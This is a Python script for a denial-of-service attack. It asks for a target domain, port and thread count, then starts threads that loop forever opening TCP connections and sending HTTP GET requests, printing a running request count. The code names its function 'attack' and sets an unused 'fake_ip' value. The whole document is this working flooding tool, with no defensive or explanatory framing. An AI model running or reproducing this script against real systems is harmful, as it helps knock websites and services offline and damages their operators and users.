import socket
import threading

target_domain = str(input("Insert target’s domain: "))
port = int(input("Insert Port: "))
num_threads = int(input("Insert number of Threads: "))
fake_ip = '44.197.175.168'

# Counter for threads
counter_lock = threading.Lock()
counter = 0

def get_target_ip(domain):
    try:
        # Use socket.getaddrinfo for more reliable DNS resolution
        result = socket.getaddrinfo(domain, port, socket.AF_INET, socket.SOCK_STREAM)
        target_ip = result[0][4][0]
        return target_ip
    except socket.gaierror as e:
        print(f"Error resolving domain: {e}")
        return None

def attack(thread_count, target_ip):
    global counter
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
        s.sendto(("Host: " + target_domain + "\r\n\r\n").encode('ascii'), (target_ip, port))
        s.close()

        # Update and print the counter
        with counter_lock:
            counter += 1
            print(f"Thread {thread_count} - Requests Sent: {counter}")

# Resolve the domain to an IP address
target_ip = get_target_ip(target_domain)
print(target_ip)
if target_ip:
    # Create and start threads
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(i + 1, target_ip))
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()
else:
    print("Exiting due to error resolving domain.")
